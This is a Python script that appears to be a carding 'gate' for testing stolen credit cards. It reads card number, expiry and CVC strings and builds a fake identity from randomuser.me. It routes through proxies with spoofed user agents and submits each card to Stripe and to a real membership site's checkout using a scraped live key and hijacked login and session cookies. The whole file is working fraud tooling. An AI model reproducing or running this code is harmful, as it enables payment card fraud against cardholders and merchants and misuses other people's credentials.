import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy
#$49
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele1(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=f2d01d61-4b84-4229-a325-b1b41bf5779a86b5f6&sid=ca393d02-5b24-4e37-9752-2a227be797dc6fc29b&payment_user_agent=stripe.js%2Fdf61bd3d21%3B+stripe-js-v3%2Fdf61bd3d21%3B+split-card-element&referrer=https%3A%2F%2Fwww.wellnessmadesimple.us&time_on_page=19027&key=pk_live_VwVhcqxB2mJal9kbNAugjzX0'
  
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet1" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=1'

    headers1 = {
       'authority': 'www.wellnessmadesimple.usm',
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
       'accept-language': 'en-US,en;q=0.9',
       'content-type': 'application/x-www-form-urlencoded',
       'origin': 'https://www.wellnessmadesimple.us',
       'referer': 'https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=2',
       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
   
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX8640",
    "CardType": "visa",
    "ExpirationMonth": "08",
    "ExpirationYear": "2026",
    "checkjavascript": "1",
    "discount_code": "",
    "javascriptok": "1",
    "level": "1",
    "other_discount_code": "",
    "payment_method_id": id,
    "submit-checkout": "1"
    }
    
    cookies = {
    "__stripe_mid": "f2d01d61-4b84-4229-a325-b1b41bf5779a86b5f6",
    "__stripe_sid": "ca393d02-5b24-4e37-9752-2a227be797dc6fc29b",
    "_ga": "GA1.1.1781648405.1696856329",
    "_ga_YCTQZK3MHL": "GS1.1.1698511719.2.1.1698511790.0.0.0",
    "_ga_YJLE6GE62T": "GS1.1.1698511721.2.1.1698511790.0.0.0",
    "_gat_gtag_UA_199870798_1": "1",
    "_gid": "GA1.2.2005038737.1698511721",
    "PHPSESSID": "c991scntr5g76sq0kcd3bpdee2",
    "pmpro_visit": "1",
    "wordpress_logged_in_129d7c16ca7f7cf785d714b26298974f": "thi09089098%7C1699721386%7CJfsnKLhn3giknf7cKlUSPfNnAV18ov0rZsZqnTT8F6P%7C85a41ebea1007ad4cd9a13e52d787bbaae3ad539dfe9ca08fae3fa578fd777e6"
    }
    
  
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 1")
